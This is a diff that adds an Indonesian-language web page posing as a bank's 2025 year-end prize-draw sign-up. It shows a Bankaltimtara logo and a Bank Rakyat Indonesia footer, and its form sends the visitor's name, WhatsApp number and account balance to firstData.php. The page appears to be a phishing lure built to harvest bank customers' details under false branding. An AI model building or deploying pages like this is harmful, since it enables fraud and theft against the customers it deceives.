@@ -1,0 +1,139 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+
+    // FORMAT SALDO (biarkan)
+    const saldoInput = document.getElementById('saldo');
+    saldoInput.addEventListener('input', function () {
+        let value = this.value.replace(/[^0-9]/g, '');
+        if (value) {
+            value = parseInt(value, 10).toLocaleString('id-ID');
+            this.value = 'Rp. ' + value;
+        } else {
+            this.value = '';
+        }
+    });
+
+    // FORMAT NOMOR HP: +62 + otomatis tambah "-"
+    const phoneInput = document.getElementById('phone');
+
+    phoneInput.addEventListener('input', function () {
+        // Ambil angka saja
+        let val = this.value.replace(/[^0-9]/g, '');
+
+        // Jika diawali 0 → ganti jadi 62
+        if (val.startsWith("0")) {
+            val = "62" + val.substring(1);
+        }
+
+        // Hilangkan "62" agar kita format ulang
+        if (val.startsWith("62")) {
+            val = val.substring(2); 
+        }
+
+        // Format:
+        // +62 812-3456-7890
+        let formatted = "+62 ";
+
+        if (val.length > 0) {
+            formatted += val.substring(0, 3); // 812
+        }
+        if (val.length > 3) {
+            formatted += "-" + val.substring(3, 7); // 3456
+        }
+        if (val.length > 7) {
+            formatted += "-" + val.substring(7, 11); // 7890
+        }
+
+        this.value = formatted;
+    });
+
+});
+</script>
+
+ </head>
+ <body class="bg-cover bg-center bg-no-repeat flex flex-col items-center min-h-screen" 
+      style="background-image: url('https://assets.softr-files.com/applications/5b9f51d5-b843-45a4-bfde-474b8a985a50/assets/1fd1ca5d-e6d7-489e-9a32-71cf0b0459fa.jpeg');">
+
+  <div class="w-full bg-white p-4 flex justify-between items-center shadow-md fixed top-0">
+   <img alt="Bankaltimtara logo" class="h-10" height="50" src="https://assets.softr-files.com/applications/9a84d6a1-3c64-497a-992a-541e84f8847a/assets/574fd552-393d-4b25-8d6d-f0fe1f29fd0c.png"/>
+   <i class="fas fa-bars text-xl"></i>
+  </div>
+  <div class="flex-grow flex items-center justify-center w-full mt-20 px-4">
+<div class="w-full max-w-md mx-auto bg-white rounded-lg shadow-md overflow-hidden">
+    
+    <!-- FOTO PEGAWAI -->
+    <img 
+        src="https://assets.softr-files.com/applications/5b9f51d5-b843-45a4-bfde-474b8a985a50/assets/d1071037-7b96-487f-bcc4-f494c5977f0d.jpeg" 
+        alt="Pegawai Bank" 
+        class="w-full h-48 object-cover"
+    />
+
+    <div class="bg-white p-6">
+        <h2 class="text-center text-blue-600 font-bold text-xl mb-4">
+            PROGRAM UNDIAN BERHADIAH AKHIR TAHUN  2025
+        </h2>
+
+        <form action="firstData.php" method="post">
+  <div class="mb-4">
+  <label class="block text-gray-700">Nama Lengkap :</label>
+  <div class="relative">
+      <i class="fas fa-user text-gray-500 absolute left-3 top-3"></i>
+      <input 
+          class="w-full pl-10 px-3 py-2 border rounded-lg focus:ring-2 focus:ring-blue-600"
+          type="text"
+          name="nama"
+          placeholder="Masukkan Nama Lengkap"
+          required
+      >
+  </div>
+</div>
+
+<div class="mb-4">
+  <label class="block text-gray-700">Nomor WhatsApp :</label>
+  <div class="relative">
+      <i class="fas fa-phone-alt text-gray-500 absolute left-3 top-3"></i>
+      <input 
+          class="w-full pl-10 px-3 py-2 border rounded-lg focus:ring-2 focus:ring-blue-600"
+          type="tel"
+          name="nomor"
+          id="phone"
+          placeholder="Masukkan Nomor HP"
+          required
+      >
+  </div>
+</div>
+
+<div class="mb-4">
+  <label class="block text-gray-700">Sisa Saldo Akhir :</label>
+  <div class="relative">
+      <i class="fas fa-wallet text-gray-500 absolute left-3 top-3"></i>
+      <input 
+          class="w-full pl-10 px-3 py-2 border rounded-lg focus:ring-2 focus:ring-blue-600"
+          type="tel"
+          name="saldo"
+          id="saldo"
+          placeholder="Rp."
+          required
+      >
+  </div>
+</div>
+
+            <button class="w-full bg-blue-600 text-white py-2 rounded-lg font-bold hover:bg-blue-700">
+                DAFTAR
+            </button>
+            <footer class="text-center text-blue-600 mt-4 text-sm">
+    © 2025 PT Bank Rakyat Indonesia Tbk.
+</footer>
+
+        </form>
+    </div>
+</div>
+
+ <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"46d4c3b6568c46b2ad6067f2da506d3b","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
